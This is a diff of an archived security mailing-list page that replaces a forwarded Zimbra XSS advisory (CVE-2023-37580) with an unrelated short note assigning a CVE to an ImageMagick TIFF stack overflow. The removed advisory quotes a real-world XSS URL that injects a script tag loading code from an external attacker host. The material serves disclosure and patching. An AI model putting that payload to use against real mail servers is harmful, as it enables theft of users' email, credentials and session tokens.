@@ -1,71 +1,25 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/11/17/2
-Message-ID: <4nksyq7teu5vpqkx5tzlmpi6pqimagq3jdby3u4g3e5lzqodij@noxitrjl7ffb>
-Date: Fri, 17 Nov 2023 14:11:59 +0200
-From: Valtteri Vuorikoski <vuori@...com.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/06/14/1
+Message-ID: <ZIlQkTsEsfKbRus7@eldamar.lan>
+Date: Wed, 14 Jun 2023 07:30:57 +0200
+From: Salvatore Bonaccorso <carnil@...ian.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2023-37580 (and others): XSS vulnerabilities in Zimbra Collaboration Suite
+Subject: Re: Stack overflow in imagemagick coders/tiff.c
 Content-Type: text/plain; charset=utf-8
 
-Not associated with Zimbra/TAG, just forwarding this.
+Hi
 
-The Zimbra Collaboration Suite is a groupware suite that includes a
-webmail client. While the current main offering is a paid product, an
-open-source version is available on Zimbra's Github.
+On Mon, May 29, 2023 at 08:11:18AM +0000, Bastien Roucariès wrote:
+> Hi,
+> 
+> Reading changelog and code of imagemagick, I want to report a stack overflow with crafted tiff file in imagemagick
+> 
+> Fixed (after 6.9.12-26) by:
+> https://github.com/ImageMagick/ImageMagick6/commit/85a370c79afeb45a97842b0959366af5236e9023
 
-There appear to be multiple recent vulnerabilities in the suite that
-allow Javascript code to be injected into pages running in
-authenticated contexts that affect the 8.8.x, 9.0.x and/or 10.0.x
-release trains.
+CVE-2023-3195 has been assigned for this issue according to
+https://bugzilla.redhat.com/show_bug.cgi?id=2214141 (not yet on
+cve.org feed itself).
 
-Google TAG has published an analysis of CVE-2023-37580 at
-<https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/>:
-
-  [T]here was a vulnerability in Zimbra that injected the parameter
-  within the URL directly into the webpage, causing the script to
-  be executed. An example that could trigger the XSS is:
-
-    https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2F
-
-  which decodes to:
-
-    https://mail.REDACTED[.]com/m/momoveto?st=acg"/><script src="https://REDACTED/script.js"></script>//
-
-  The fix was to escape the contents of the st parameter before it was
-  set as the value in an html object.
-
-According to TAG, the vulnerability is being actively exploited to
-"steal email data, user credentials, and authentication tokens". It
-appears that at least some of the same threat actors that were using
-the recent Roundcube webmail exploit (CVE-2023-5631) to target
-European government users have also been exploiting this vulnerability
-against similar targets. However, unlike the Roundcube vulnerability,
-CVE-2023-37580 is not "zero-click" in the sense that simply opening an
-e-mail message is enough to trigger the exploit.
-
-Independent of the TAG report, the Zimbra security advisory page
-<https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories> lists at
-least three other recent XSS vulnerabilities that based on the brief
-description and recent Github commits may provide alternative
-avenues for similar exploits: CVE-2023-43102, CVE-2023-41106 and
-CVE-2023-43103.
-
-As Zimbra no longer provides packaged versions of the suite's
-open-source version, users must manually update their installations
-from the upstream repository or rely on third-party-provided
-packages/container images. Based on the advisory page, the tagged
-releases 8.8.15p44, 9.0.0p37 and 10.0.5 should include patches for all
-of the above.
-
-The official "advisories" are quite uninformative, but the
-following commits appear related to the above CVEs:
-
-CVE-2023-37580: https://github.com/Zimbra/zm-web-client/commit/874ac8c158532a057b9857c21e1e03853b77ee6b
-CVE-2023-43103: https://github.com/Zimbra/zm-web-client/commit/834eaf4b5eac8ed5cca9a994f9f031aa8d50d34a
-
-File removal commit
-<https://github.com/Zimbra/zm-web-client/commit/ef57b9ad60d4530a9659d9585c5d44eeb72b6cd9>
-may be related to one (or more) of the other CVEs.
-
- -Valtteri
- 
+Regards,
+Salvatore
